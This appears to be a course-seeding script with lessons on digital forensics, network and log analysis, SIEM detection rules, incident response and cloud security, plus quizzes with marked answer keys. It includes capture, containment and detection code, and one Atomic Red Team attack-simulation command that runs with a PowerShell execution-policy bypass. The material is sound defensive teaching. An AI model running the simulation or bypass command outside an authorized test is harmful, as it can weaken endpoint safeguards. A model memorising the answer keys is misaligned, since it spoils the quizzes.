1. Write a forensic report based on a simulated investigation.
2. Have a peer review your report and provide feedback.
3. Create a report template for your organization.

### Key Takeaways

- Reports must be clear for non-technical readers and detailed enough for verification
- Every finding must be supported by independently verifiable evidence
- Chain of custody gaps can invalidate strong evidence
- Peer review improves report quality and credibility

### References

- NIST SP 800-86
- IACIS Certified Forensic Computer Examiner Body of Knowledge
- SWGDE Best Practices`,
            questions: [
              { text: 'What is the primary purpose of the executive summary?', answers: [{ text: 'To provide a high-level overview for non-technical decision makers', isCorrect: true }, { text: 'To document technical methodology', isCorrect: false }, { text: 'To list all raw evidence files', isCorrect: false }, { text: 'To include tool configuration details', isCorrect: false }] },
              { text: 'Why must every finding be supported by evidence?', answers: [{ text: 'To ensure the report is legally defensible and independently verifiable', isCorrect: true }, { text: 'Because it makes the report longer', isCorrect: false }, { text: 'To comply with formatting', isCorrect: false }, { text: 'Only for criminal cases', isCorrect: false }] },
              { text: 'What happens if chain of custody has gaps?', answers: [{ text: 'Evidence may be ruled inadmissible', isCorrect: true }, { text: 'Investigation must restart', isCorrect: false }, { text: 'Tools produce inaccurate results', isCorrect: false }, { text: 'Nothing, it is only a formality', isCorrect: false }] },
              { text: 'What role does peer review play?', answers: [{ text: 'Verifies methodology, interpretation, and conclusions', isCorrect: true }, { text: 'Only for academic publications', isCorrect: false }, { text: 'Replaces QA checks', isCorrect: false }, { text: 'Delays the investigation', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Network Forensics & Log Analysis',
        order: 3,
        lessons: [
          {
            title: 'Network Traffic Analysis',
            order: 1,
            content: `# Network Traffic Analysis

### Learning Objectives

- Capture and analyze network traffic for forensic purposes
- Identify malicious traffic patterns and indicators
- Use Wireshark and tcpdump for packet analysis
- Extract files and artifacts from network captures

### Section 1: Network Forensics Fundamentals

Network forensics involves capturing, recording, and analyzing network traffic to investigate security incidents. Unlike host-based forensics, network forensics provides visibility into communications between systems, revealing data exfiltration, command-and-control channels, lateral movement, and external attacks. Network evidence is often available even when host-based evidence has been destroyed. Network traffic analysis requires understanding the TCP/IP protocol stack, common application protocols, and traffic patterns associated with malicious activity.

### Section 2: Capture Methods and Tools

Passive capture using network taps or port mirroring provides complete visibility without affecting network performance. Network taps physically split the signal. Port mirroring copies traffic from one switch port to another.

\`\`\`bash
# Capture traffic with tcpdump
sudo tcpdump -i eth0 -w capture.pcap -c 100000
# Capture specific traffic
sudo tcpdump -i eth0 host 192.168.1.100 and port 443 -w suspicious.pcap
# Capture DNS traffic
sudo tcpdump -i eth0 port 53 -w dns-capture.pcap
\`\`\`

Wireshark provides a graphical interface with display filters, protocol dissectors, and statistics. The follow TCP stream feature reconstructs complete conversations from individual packets.

### Section 3: Identifying Malicious Traffic

Malicious traffic patterns include beaconing (regular periodic C2 connections), data exfiltration (large outbound transfers), lateral movement (internal systems on unexpected ports), and scanning (sequential probes). DNS analysis reveals C2 domains, DNS tunneling, and DGAs. HTTP analysis identifies web-based C2 channels. TLS analysis examines certificate anomalies and JA3 fingerprints.

### Section 4: Extracting Artifacts

Wireshark can extract files transferred over HTTP, SMB, FTP. The export objects feature saves transferred files. PCAP files serve as permanent evidence. Timeline analysis of network traffic reveals the sequence of events during an incident. Correlating network timestamps with host-based evidence provides a complete picture.

### Hands-On Practice

1. Capture network traffic during a simulated attack and identify indicators.
2. Extract files transferred over HTTP from a pcap file.
3. Analyze DNS traffic to identify a simulated DGA-based C2 channel.

### Key Takeaways

- Network forensics provides visibility host-based analysis may miss
- Passive capture preserves evidence integrity and network performance
- DNS analysis is critical for identifying C2 channels
- Network timestamps help establish the incident timeline

### References

- Wireshark Documentation: https://www.wireshark.org/docs/
- SANS Network Forensics: https://www.sans.org/white-papers/network-forensics/
- NetworkMiner: https://www.netresec.com/?page=NetworkMiner`,
            questions: [
              { text: 'What is the advantage of passive network capture?', answers: [{ text: 'Complete visibility without affecting performance or alerting attackers', isCorrect: true }, { text: 'It encrypts all captured traffic', isCorrect: false }, { text: 'It automatically blocks malicious traffic', isCorrect: false }, { text: 'It is cheaper than active monitoring', isCorrect: false }] },
              { text: 'What behavior indicates C2 beaconing?', answers: [{ text: 'Regular periodic connections with consistent timing', isCorrect: true }, { text: 'Large one-time transfers', isCorrect: false }, { text: 'Single DNS queries', isCorrect: false }, { text: 'Encrypted HTTPS to known servers', isCorrect: false }] },
              { text: 'What Wireshark feature reconstructs conversations?', answers: [{ text: 'Follow TCP Stream', isCorrect: true }, { text: 'Export Objects', isCorrect: false }, { text: 'Display Filters', isCorrect: false }, { text: 'Protocol Dissectors', isCorrect: false }] },
              { text: 'Why is DNS analysis critical?', answers: [{ text: 'Reveals C2 domains, tunneling, and DGA communications', isCorrect: true }, { text: 'DNS is always unencrypted', isCorrect: false }, { text: 'DNS traffic is always malicious', isCorrect: false }, { text: 'Replaces packet capture', isCorrect: false }] },
            ],
          },
          {
            title: 'Log Analysis & SIEM Operations',
            order: 2,
            content: `# Log Analysis & SIEM Operations

### Learning Objectives

- Configure and operate SIEM platforms for security monitoring
- Develop log parsing and normalization strategies
- Create effective detection rules and alerts
- Conduct log-based investigations for incident response

### Section 1: SIEM Architecture and Operations

SIEM platforms aggregate, normalize, and analyze log data from across the organization. Platforms include Splunk, Elastic SIEM, Microsoft Sentinel, IBM QRadar, and open-source alternatives like Wazuh. SIEM operations require ongoing maintenance including log source onboarding, parser development, detection rule tuning, and performance optimization. The SIEM must ingest logs from firewalls, endpoints, servers, applications, cloud services, and identity providers.

### Section 2: Log Parsing and Normalization

Raw logs arrive in various formats. Parsing extracts structured fields from unstructured entries. Normalization converts parsed fields into a common schema enabling cross-source correlation. Proper normalization is essential for detection rules that reference fields across multiple log sources.

\`\`\`python
import re
from datetime import datetime

def parse_syslog(raw_log):
    pattern = r'(\\w+ \\d+ \\d+:\\d+:\\d+) (\\S+) (\\S+): (.+)'
    match = re.match(pattern, raw_log)
    if match:
        return {
            "timestamp": datetime.strptime(match.group(1), "%b %d %H:%M:%S"),
            "host": match.group(2),
            "service": match.group(3),
            "message": match.group(4)
        }
    return {"raw": raw_log, "normalized": False}
\`\`\`

### Section 3: Detection Rule Development

Detection rules identify security events by matching log patterns against known threat indicators. Rules can be signature-based, statistical-based, or rules-based. Effective rules balance sensitivity (catching real threats) with specificity (avoiding false positives). Regular rule tuning adjusts thresholds and adds exclusions based on operational feedback.

\`\`\`python
class BruteForceDetector:
    def __init__(self, threshold=5, window_minutes=10):
        self.threshold = threshold
        self.window = window_minutes
        self.failed_attempts = {}

    def evaluate(self, log_entry):
        if log_entry["event_type"] == "authentication_failure":
            key = f"{log_entry['source_ip']}:{log_entry['target_user']}"
            if key not in self.failed_attempts:
                self.failed_attempts[key] = []
            self.failed_attempts[key].append(log_entry["timestamp"])
            if len(self.failed_attempts[key]) >= self.threshold:
                return {"alert": True, "severity": "high"}
        return {"alert": False}
\`\`\`

### Section 4: Log-Based Investigation Techniques

When investigating an incident, start with a time window around the alert, identify relevant log sources, pivot on key indicators, and correlate across sources. SIEM search languages like Splunk SPL and Elastic KQL enable rapid exploration. Understanding the normal baseline for each log source is essential for identifying anomalies.

### Hands-On Practice

1. Set up Wazuh SIEM and configure log collection from three sources.
2. Develop a detection rule for lateral movement using authentication logs.
3. Investigate a simulated incident using SIEM searches.

### Key Takeaways

- SIEM effectiveness depends on comprehensive log coverage and proper normalization
- Detection rules must balance sensitivity with specificity
- Log investigation requires understanding normal baselines
- Cross-source correlation provides visibility single-source analysis cannot

### References

- Splunk Security Essentials: https://splunkbase.splunk.com/app/3435/
- Elastic SIEM: https://www.elastic.co/guide/en/security/current/
- Wazuh: https://documentation.wazuh.com/`,
            questions: [
              { text: 'What is the primary purpose of log normalization?', answers: [{ text: 'Convert parsed fields into a common schema for cross-source correlation', isCorrect: true }, { text: 'Compress log data', isCorrect: false }, { text: 'Encrypt sensitive entries', isCorrect: false }, { text: 'Delete duplicates', isCorrect: false }] },
              { text: 'What type of rule identifies anomalies from baselines?', answers: [{ text: 'Statistical-based rules', isCorrect: true }, { text: 'Signature-based rules', isCorrect: false }, { text: 'Rules-based rules', isCorrect: false }, { text: 'Pattern-matching rules', isCorrect: false }] },
              { text: 'What is the first step in SIEM investigation?', answers: [{ text: 'Define a time window and identify relevant log sources', isCorrect: true }, { text: 'Start with DNS logs', isCorrect: false }, { text: 'Reboot the SIEM server', isCorrect: false }, { text: 'Delete unrelated alerts', isCorrect: false }] },
              { text: 'Why is cross-source correlation important?', answers: [{ text: 'Provides visibility single-source analysis cannot achieve', isCorrect: true }, { text: 'Reduces log volume', isCorrect: false }, { text: 'Automatically blocks threats', isCorrect: false }, { text: 'Only for compliance', isCorrect: false }] },
            ],
          },
          {
            title: 'Malware Network Indicators',
            order: 3,
            content: `# Malware Network Indicators

### Learning Objectives

- Identify network-based indicators of malware activity
- Detect command-and-control communication patterns
- Analyze DNS-based malware techniques
- Extract network IOCs from traffic analysis

### Section 1: C2 Communication Patterns

Malware uses various protocols for command and control. HTTP/HTTPS is the most common due to ubiquity. DNS tunneling encodes data in DNS queries. Raw sockets bypass application layer monitoring. Domain fronting uses CDN infrastructure to hide destinations. C2 implementations range from simple HTTP polling to sophisticated encrypted channels. The protocol choice often indicates threat actor sophistication.

### Section 2: DNS-Based Techniques

Malware uses DNS for C2 through direct queries, DNS tunneling encoding data in subdomains, and DGAs producing pseudo-random domain names.

\`\`\`python
import math
from collections import Counter

def calculate_entropy(domain):
    freq = Counter(domain)
    length = len(domain)
    entropy = -sum((count/length) * math.log2(count/length)
                   for count in freq.values())
    return entropy

def detect_dga(domain, threshold=3.5):
    entropy = calculate_entropy(domain.split('.')[0])
    has_numbers = any(c.isdigit() for c in domain)
    long_label = len(domain.split('.')[0]) > 12
    score = 0
    if entropy > threshold: score += 2
    if has_numbers: score += 1
    if long_label: score += 1
    return score >= 3
\`\`\`

### Section 3: Data Exfiltration Detection

Exfiltration techniques include HTTP POST uploads, DNS data encoding, SMTP attachments, FTP transfers, and cloud storage uploads. Detection focuses on unusual data volumes, protocol anomalies, and suspicious destinations. Volume-based detection identifies large outbound transfers. Protocol analysis detects data encoded in unusual fields. Timing analysis reveals off-hours exfiltration.

### Section 4: Network IOC Extraction

Network IOCs include IP addresses, domain names, URLs, JA3 fingerprints, TLS certificate characteristics, and DNS query patterns.

\`\`\`bash
# Extract indicators from pcap
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "tls.handshake.type == 11" -T fields -e x509sat.utf8String
\`\`\`

### Hands-On Practice

1. Analyze malware traffic and extract all C2 indicators.
2. Write a Python script to detect DGA domains using entropy analysis.
3. Develop rules for detecting data exfiltration through DNS tunneling.

### Key Takeaways

- DNS is critical for malware C2 because it is rarely blocked
- DGA detection uses entropy analysis and pattern recognition
- Data exfiltration detection requires volume, protocol, and timing analysis
- Automated IOC extraction improves consistency

### References

- MITRE ATT&CK C2: https://attack.mitre.org/tactics/TA0011/
- JA3/JA3S: https://github.com/salesforce/ja3
- Passive DNS: https://www.sans.org/white-papers/passive-dns/`,
            questions: [
              { text: 'Why do malware authors use HTTP/HTTPS for C2?', answers: [{ text: 'Blends with normal web traffic and is rarely blocked', isCorrect: true }, { text: 'HTTP is the fastest protocol', isCorrect: false }, { text: 'HTTP encryption prevents all detection', isCorrect: false }, { text: 'HTTP does not require connectivity', isCorrect: false }] },
              { text: 'What is DGA used for?', answers: [{ text: 'Generating pseudo-random domain names for resilient C2', isCorrect: true }, { text: 'Encrypting DNS traffic', isCorrect: false }, { text: 'Blocking malicious domains', isCorrect: false }, { text: 'Speeding up DNS resolution', isCorrect: false }] },
              { text: 'What detects data exfiltration through DNS?', answers: [{ text: 'Analyzing DNS query lengths and entropy for encoded data', isCorrect: true }, { text: 'Monitoring HTTP POST requests', isCorrect: false }, { text: 'Checking firewall logs only', isCorrect: false }, { text: 'Scanning for viruses', isCorrect: false }] },
              { text: 'What does JA3 fingerprinting identify?', answers: [{ text: 'TLS client implementations from handshake parameters', isCorrect: true }, { text: 'DNS query patterns', isCorrect: false }, { text: 'HTTP headers', isCorrect: false }, { text: 'Email attachments', isCorrect: false }] },
            ],
          },
          {
            title: 'SIEM Use Case Development',
            order: 4,
            content: `# SIEM Use Case Development

### Learning Objectives

- Design and implement SIEM use cases for common threats
- Test and validate detection rules before deployment
- Optimize SIEM performance and reduce false positives
- Measure SIEM effectiveness through key metrics

### Section 1: Use Case Development Process

SIEM use cases translate security requirements into detection rules. The process begins with threat modeling to identify likely and impactful threats. Each threat is mapped to observable indicators and detection logic. Use cases are prioritized based on risk, feasibility, and data sources. The threat-driven approach ensures detection capabilities align with the actual threat landscape. Starting with MITRE ATT&CK techniques provides a structured framework.

### Section 2: Use Case Categories

Threat detection identifies active attacks. Compliance ensures regulatory requirements. Operational detects system failures. Risk management identifies vulnerabilities. Each category requires different data sources, detection logic, and response procedures.

\`\`\`python
use_cases = {
    "UC-001": {
        "name": "Brute Force Authentication",
        "category": "Threat Detection",
        "mitre": "T1110.001",
        "data_sources": ["authentication_logs", "firewall_logs"],
        "detection_logic": "More than 5 failed logins from same source in 10 minutes",
        "severity": "High"
    },
    "UC-002": {
        "name": "Lateral Movement via SMB",
        "category": "Threat Detection",
        "mitre": "T1021.002",
        "data_sources": ["windows_event_logs", "network_logs"],
        "detection_logic": "SMB connections between non-communicating workstations",
        "severity": "High"
    }
}
\`\`\`

### Section 3: Testing and Validation

Detection rules must be tested before production. Testing uses known-bad samples, attack simulation tools, and historical data. False positive analysis identifies legitimate activities that trigger alerts. Regular rule tuning adjusts thresholds and adds exclusions based on operational feedback.

\`\`\`bash
# Test with Atomic Red Team
powershell -ExecutionPolicy Bypass -File Install-AtomicRedTeam.ps1
Invoke-AtomicTest T1110.001 -TestNumbers 1
\`\`\`

### Section 4: Measuring SIEM Effectiveness

Key metrics include MTTD, MTTR, alert volume, false positive rate, and coverage percentage. A mature SIEM should cover at least 60% of relevant MITRE ATT&CK techniques. Regular gap analyses identify missing detection capabilities.

### Hands-On Practice

1. Develop three SIEM use cases for brute force, lateral movement, and data exfiltration.
2. Test detection rules using Atomic Red Team in staging.
3. Build a dashboard tracking alert volume, MTTD, and coverage percentage.

### Key Takeaways

- Use cases should be threat-driven and mapped to MITRE ATT&CK
- Testing prevents false positives and detection gaps
- Rule tuning is an ongoing process
- Coverage metrics demonstrate SIEM value

### References

- MITRE ATT&CK: https://attack.mitre.org/
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
- Splunk Use Case Library`,
            questions: [
              { text: 'What framework provides structured SIEM use case development?', answers: [{ text: 'MITRE ATT&CK', isCorrect: true }, { text: 'NIST CSF', isCorrect: false }, { text: 'ISO 27001', isCorrect: false }, { text: 'COBIT', isCorrect: false }] },
              { text: 'Why must detection rules be tested before deployment?', answers: [{ text: 'Verify they detect intended threats without excessive false positives', isCorrect: true }, { text: 'Only for compliance', isCorrect: false }, { text: 'To reduce log sources', isCorrect: false }, { text: 'Testing is not necessary', isCorrect: false }] },
              { text: 'What does MTTD measure?', answers: [{ text: 'Mean time to detect security incidents', isCorrect: true }, { text: 'Mean time to delete logs', isCorrect: false }, { text: 'Mean time to deploy patches', isCorrect: false }, { text: 'Mean time to disable accounts', isCorrect: false }] },
              { text: 'What percentage of ATT&CK techniques should a mature SIEM cover?', answers: [{ text: 'At least 60%', isCorrect: true }, { text: '100%', isCorrect: false }, { text: 'Only 10%', isCorrect: false }, { text: 'Coverage is not important', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'IR in Practice',
        order: 4,
        lessons: [
          {
            title: 'Malware Response & Containment',
            order: 1,
            content: `# Malware Response & Containment

### Learning Objectives

- Execute effective malware containment procedures
- Identify initial infection vectors and scope
- Coordinate eradication and recovery activities
- Prevent reinfection through hardening measures

### Section 1: Initial Assessment and Containment

When malware is detected, immediate assessment determines scope and severity. Key questions: How many systems affected? Is malware still active? What is the infection vector? What data may be compromised? Containment priorities: preventing further spread, preserving evidence, maintaining business operations. Network isolation, account isolation, and email quarantine are common actions.

\`\`\`bash
# Containment actions
sudo iptables -A FORWARD -s 10.0.5.0/24 -j DROP
sudo iptables -A FORWARD -d 10.0.5.0/24 -j DROP
sudo chage -E 0 compromised_user
sudo passwd -l compromised_user
\`\`\`

### Section 2: Malware Analysis for Response

Rapid analysis focuses on actionable intelligence. Extract IOCs including file hashes, C2 domains, IP addresses, and persistence mechanisms. Identify malware family and known behaviors. Extract network indicators for C2 blocking. Identify persistence mechanisms for eradication. Determine if data exfiltration occurred.

### Section 3: Eradication and Recovery

Eradication removes all traces: removing malware files, deleting persistence mechanisms, disabling compromised accounts, patching vulnerabilities, rebuilding systems from clean images. Recovery restores systems while monitoring for reinfection. Restore from verified clean backups. Validate integrity before reconnecting. Implement enhanced monitoring.

### Section 4: Preventing Reinfection

Post-incident hardening: patching exploited vulnerabilities, implementing email filtering, deploying application whitelisting, enhancing endpoint detection, conducting targeted user awareness training based on the initial infection vector.

### Hands-On Practice

1. Simulate a malware outbreak and practice the complete response lifecycle.
2. Develop containment playbooks for ransomware, trojan, and worm scenarios.
3. Create a post-incident hardening checklist.

### Key Takeaways

- Containment must balance preventing spread with maintaining operations
- Rapid IOC extraction enables detection across the environment
- Eradication thoroughness directly impacts reinfection risk
- Post-incident hardening prevents recurrence

### References

- SANS Malware Response: https://www.sans.org/white-papers/malware-response/
- NIST SP 800-83
- MITRE ATT&CK: https://attack.mitre.org/`,
            questions: [
              { text: 'What should be the first priority when malware is detected?', answers: [{ text: 'Assess scope and prevent further spread while preserving evidence', isCorrect: true }, { text: 'Immediately shut down all systems', isCorrect: false }, { text: 'Reinstall the operating system', isCorrect: false }, { text: 'Contact the software vendor', isCorrect: false }] },
              { text: 'Why is understanding the propagation mechanism important?', answers: [{ text: 'Guides containment decisions about which systems to isolate', isCorrect: true }, { text: 'Helps determine file size', isCorrect: false }, { text: 'Only for compliance', isCorrect: false }, { text: 'Determines ransom amount', isCorrect: false }] },
              { text: 'What is the primary goal of post-incident hardening?', answers: [{ text: 'Prevent the same attack from succeeding twice', isCorrect: true }, { text: 'Make the system run faster', isCorrect: false }, { text: 'Reduce security tools', isCorrect: false }, { text: 'Improve user experience', isCorrect: false }] },
              { text: 'Why restore from verified clean backups?', answers: [{ text: 'Ensure the restored system does not contain malware artifacts', isCorrect: true }, { text: 'Backups are always smaller', isCorrect: false }, { text: 'Restores are faster', isCorrect: false }, { text: 'Only for compliance', isCorrect: false }] },
            ],
          },
          {
            title: 'Data Breach Response',
            order: 2,
            content: `# Data Breach Response

### Learning Objectives

- Execute data breach response procedures
- Determine notification requirements across jurisdictions
- Coordinate legal, regulatory, and public communications
- Manage breach remediation and customer impact

### Section 1: Breach Assessment and Classification

Data breaches require specialized response due to legal implications. Assessment determines what data was compromised, how many individuals affected, and whether data was encrypted. Key questions: What data types (PII, PHI, PCI)? How many affected? Was data encrypted? Has data been accessed or exfiltrated? Geographic scope?

### Section 2: Legal and Regulatory Requirements

GDPR requires notification within 72 hours. CCPA requires notification to California residents. HIPAA requires notification to HHS, affected individuals, and potentially media. PCI DSS requires acquiring bank notification. Multi-jurisdictional breaches require navigating overlapping requirements.

\`\`\`markdown
## Breach Notification Tracker
- Incident ID: BREACH-2024-001
- Discovery Date: 2024-01-15
- Affected Records: 50,000
| Jurisdiction | Deadline | Status |
|-------------|----------|--------|
| GDPR (EU) | 72 hours | Pending |
| CCPA (CA) | Per statute | Pending |
| HIPAA | 60 days | Pending |
\`\`\`

### Section 3: Communication Strategy

Communications require coordination across multiple audiences. Affected individuals need clear, actionable information. Regulatory bodies require detailed technical information. Media communications must be accurate and measured. Prepare notification letters, FAQs, and media statements before disclosure.

### Section 4: Remediation and Credit Monitoring

Remediation extends beyond technical containment to include credit monitoring, identity theft protection, dedicated call centers, and long-term monitoring. Post-breach improvements should address the specific vulnerability that enabled the breach.

### Hands-On Practice

1. Create a breach response plan for a fictional healthcare organization.
2. Develop notification letters compliant with GDPR and CCPA.
3. Conduct a tabletop exercise simulating a data breach.

### Key Takeaways

- Notification requirements vary by jurisdiction and data type
- Legal counsel should review all breach communications
- Communication strategies must address multiple audiences
- Remediation must address root causes

### References

- GDPR Article 33
- CCPA Breach Notification: https://oag.ca.gov/privacy/ccpa
- NIST SP 800-61 Rev. 2`,
            questions: [
              { text: 'What is the GDPR breach notification deadline?', answers: [{ text: '72 hours from awareness', isCorrect: true }, { text: '30 days', isCorrect: false }, { text: 'One week', isCorrect: false }, { text: 'No specific timeframe', isCorrect: false }] },
              { text: 'Why must legal counsel review breach communications?', answers: [{ text: 'Ensure regulatory compliance while preserving legal privilege', isCorrect: true }, { text: 'Legal counsel wrote the templates', isCorrect: false }, { text: 'Legal has final say', isCorrect: false }, { text: 'Only for criminal cases', isCorrect: false }] },
              { text: 'What should remediation include beyond technical fixes?', answers: [{ text: 'Credit monitoring, identity theft protection, and dedicated support', isCorrect: true }, { text: 'Only system rebuilding', isCorrect: false }, { text: 'Only law enforcement notification', isCorrect: false }, { text: 'Nothing beyond technical fixes', isCorrect: false }] },
              { text: 'Why document the notification timeline?', answers: [{ text: 'Demonstrate compliance with regulatory deadlines', isCorrect: true }, { text: 'Makes the report longer', isCorrect: false }, { text: 'Only for internal records', isCorrect: false }, { text: 'Documentation is not important', isCorrect: false }] },
            ],
          },
          {
            title: 'Incident Documentation & Metrics',
            order: 3,
            content: `# Incident Documentation & Metrics

### Learning Objectives

- Document incidents effectively for legal and operational purposes
- Develop meaningful IR metrics for program improvement
- Track incident trends and measure response effectiveness
- Use metrics to justify security investments

### Section 1: Documentation Best Practices

Effective documentation serves multiple purposes: evidence for legal proceedings, regulatory reporting, lessons learned, and institutional knowledge. Documentation should begin at detection and continue through resolution. Every observation, action, and decision must be recorded with timestamps. Use structured templates. Include screenshots and log excerpts. Document reasoning behind decisions.

### Section 2: Developing IR Metrics

Key metrics: MTTD, MTTR, MTTC, Mean Time to Recover, Incident Volume by type and severity, False Positive Rate, Mean Time to Close. These metrics demonstrate program effectiveness, justify investments, identify trends, and measure improvement over time. Establish baselines before making changes.

### Section 3: Trend Analysis and Reporting

Regular reporting provides visibility to leadership. Monthly reports summarize incident volume, severity distribution, root cause analysis, and trend comparisons. Quarterly reports include strategic analysis of emerging threats and program improvements. Trend analysis reveals patterns: seasonal variations, new attack vectors, recurring vulnerabilities.

### Section 4: Using Metrics for Improvement

Metrics should drive continuous improvement. Increasing MTTD means detection needs enhancement. High false positive rates mean rules need tuning. Growing incident types mean preventive controls need strengthening. Metrics also support business cases for security investments.

### Hands-On Practice

1. Create a comprehensive incident documentation template.
2. Define a metrics dashboard tracking key IR KPIs.
3. Analyze incident reports to identify trends and improvement opportunities.

### Key Takeaways

- Documentation must begin at detection and continue through resolution
- IR metrics demonstrate program effectiveness and justify investments
- Trend analysis reveals patterns informing strategic decisions
- Metrics should drive continuous improvement

### References

- NIST SP 800-61 Rev. 2
- SANS IR Metrics
- Verizon DBIR`,
            questions: [
              { text: 'Why should documentation begin at detection?', answers: [{ text: 'Capture details while fresh and before evidence is altered', isCorrect: true }, { text: 'Only required at the end', isCorrect: false }, { text: 'To satisfy compliance', isCorrect: false }, { text: 'Does not matter when started', isCorrect: false }] },
              { text: 'What does MTTD measure?', answers: [{ text: 'Average time between incident occurrence and detection', isCorrect: true }, { text: 'Average time to delete logs', isCorrect: false }, { text: 'Average time to deploy patches', isCorrect: false }, { text: 'Average time to recover', isCorrect: false }] },
              { text: 'How should metrics be used?', answers: [{ text: 'Identify areas needing enhancement and drive continuous improvement', isCorrect: true }, { text: 'Only for compliance', isCorrect: false }, { text: 'To reduce incidents', isCorrect: false }, { text: 'Not useful for improvement', isCorrect: false }] },
              { text: 'Why document reasoning behind decisions?', answers: [{ text: 'Enables effective review and context for future incidents', isCorrect: true }, { text: 'Makes reports longer', isCorrect: false }, { text: 'Only for legal cases', isCorrect: false }, { text: 'Not important', isCorrect: false }] },
            ],
          },
          {
            title: 'Tabletop Exercises & Simulations',
            order: 4,
            content: `# Tabletop Exercises & Simulations

### Learning Objectives

- Design and conduct effective tabletop exercises
- Create realistic incident simulation scenarios
- Evaluate IR team performance through exercises
- Identify and address gaps in incident response procedures

### Section 1: Types of Exercises

Tabletop exercises are discussion-based sessions walking through scenarios verbally. They test procedures, communication, and decision-making without technical execution. Functional exercises involve actual execution in a controlled environment. Full-scale exercises simulate complete incidents involving all team members. Each type has distinct benefits: tabletops are low-cost and high-value for identifying gaps; functional exercises validate technical capabilities; full-scale exercises provide realistic testing.

### Section 2: Scenario Design

Effective scenarios are realistic, challenging, and aligned with organizational risks. They should test multiple IR program aspects simultaneously.

\`\`\`markdown
## Ransomware Tabletop Scenario
### Setup
- Trigger: EDR alert on production file server
- Initial observation: Files have .locked extension
### Inject 1 (T+15 min)
- Three more departments report encryption
- Help desk receives 40+ calls
### Inject 2 (T+30 min)
- Ransom note discovered with Bitcoin address
### Inject 3 (T+1 hour)
- Backup server appears unaffected
- Phishing email identified
- Lateral movement detected
### Inject 4 (T+2 hours)
- Media inquiries
- Customer data may be accessed
- Board requests briefing
\`\`\`

### Section 3: Exercise Execution

A skilled facilitator guides the exercise, introducing injects and ensuring participation. The facilitator challenges assumptions, probes for details, and introduces complications. Observers document team actions, decisions, communication patterns, and areas of confusion.

### Section 4: Evaluation and Improvement

After-action reviews within 48 hours address: Were procedures followed? Were communications effective? Were decisions prompt? What gaps were identified? Findings should produce an improvement plan with specific action items, owners, and deadlines.

### Hands-On Practice

1. Design a phishing-to-data-breach scenario with at least four injects.
2. Facilitate a tabletop exercise with your team.
3. Conduct an after-action review and create an improvement plan.

### Key Takeaways

- Regular exercises are the only way to validate IR readiness
- Scenarios should be realistic and aligned with organizational risks
- After-action reviews must produce actionable improvement plans
- Exercise frequency should increase as the program matures

### References

- NIST SP 800-84: Guide to Test, Training, and Exercise Programs
- SANS Tabletop Exercises
- CISA Tabletop Exercise Packages`,
            questions: [
              { text: 'What is the primary benefit of tabletop exercises?', answers: [{ text: 'Identifying procedural gaps through low-cost discussion-based sessions', isCorrect: true }, { text: 'Testing network infrastructure', isCorrect: false }, { text: 'Replacing real incident response', isCorrect: false }, { text: 'Satisfying audit requirements only', isCorrect: false }] },
              { text: 'When should after-action reviews be conducted?', answers: [{ text: 'Within 48 hours of each exercise', isCorrect: true }, { text: 'Only at year end', isCorrect: false }, { text: 'Only when problems are found', isCorrect: false }, { text: 'Not necessary', isCorrect: false }] },
              { text: 'What makes an effective scenario?', answers: [{ text: 'Realistic, challenging, and aligned with organizational risks', isCorrect: true }, { text: 'As simple as possible', isCorrect: false }, { text: 'Focused on a single issue', isCorrect: false }, { text: 'Should avoid complications', isCorrect: false }] },
              { text: 'What does a functional exercise involve?', answers: [{ text: 'Actual execution of response procedures in a controlled environment', isCorrect: true }, { text: 'Only verbal discussion', isCorrect: false }, { text: 'Full-scale real-world response', isCorrect: false }, { text: 'Reviewing documentation only', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 2. Cloud Security & Hardening
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Cloud Security & Hardening',
    'Comprehensive cloud security covering AWS, Azure, and GCP security fundamentals, IAM best practices, container security, and cloud hardening techniques. Students will learn to identify cloud-specific threats, implement zero-trust architectures, and secure cloud infrastructure against advanced attacks.',
    30,
    [
      {
        title: 'Cloud Fundamentals & Threat Model',
        order: 1,
        lessons: [
          {
            title: 'Cloud Service Models & Shared Responsibility',
            order: 1,
            content: `# Cloud Service Models & Shared Responsibility

### Learning Objectives

- Understand the shared responsibility model across IaaS, PaaS, and SaaS
- Identify security boundaries and common misconfigurations
- Compare security architectures of AWS, Azure, and GCP
- Assess organizational cloud security posture

### Section 1: The Shared Responsibility Model

Cloud computing fundamentally changes security ownership. Unlike traditional on-premises environments where the organization controls everything, cloud environments distribute responsibilities between provider and customer. Understanding this distribution is critical as many breaches result from customers assuming the provider handles security that is actually their responsibility. In IaaS, the provider manages physical security, networking, and virtualization. The customer handles OS, middleware, runtime, data, and applications. PaaS adds OS and middleware to the provider scope. In SaaS, the provider manages everything except data and user access.

### Section 2: Cloud Threat Landscape

Cloud environments face unique threats. Misconfiguration is the number one cause of cloud breaches. Cloud security posture management (CSPM) tools identify misconfigurations across cloud accounts. Common misconfigurations include publicly accessible storage buckets, overly permissive IAM policies, unencrypted data stores, and exposed management interfaces. Cloud-native threat detection services like AWS GuardDuty, Azure Sentinel, and GCP Security Command Center provide baseline monitoring.

### Section 3: Multi-Cloud Security Challenges

Organizations using multiple cloud providers face increased complexity. Each provider has different security models, services, and configuration options. Consistent security policies across clouds require abstraction layers or third-party tools. Identity federation across providers eliminates separate credentials. Unified logging and monitoring aggregate security data from all clouds.

\`\`\`bash
# AWS CloudTrail for logging
aws cloudtrail create-trail --name security-trail --s3-bucket-name my-security-logs
aws cloudtrail start-logging --name security-trail
# Azure Monitor for cross-cloud visibility
az monitor diagnostic-settings create --resource /subscriptions/xxx/providers/Microsoft.Compute/virtualMachines/myVM --name diagSettings --logs '[{"category":"Audit","enabled":true}]'
\`\`\`

### Section 4: Cloud Security Assessment

Cloud security assessment evaluates the security posture of cloud deployments. Assessment covers IAM configurations, network security, data protection, logging and monitoring, and compliance. Regular assessment using tools like ScoutSuite, Prowler, and CloudSploit identifies security gaps before they are exploited.

### Hands-On Practice

1. Map the shared responsibility model for your organization cloud deployments.
2. Run Prowler against an AWS account and categorize findings by severity.
3. Configure CSPM alerting for critical misconfigurations.

### Key Takeaways

- Cloud security is a shared responsibility — misconfiguration is the leading cause of breaches
- Each cloud provider has different security models and services
- Multi-cloud environments require consistent security policies
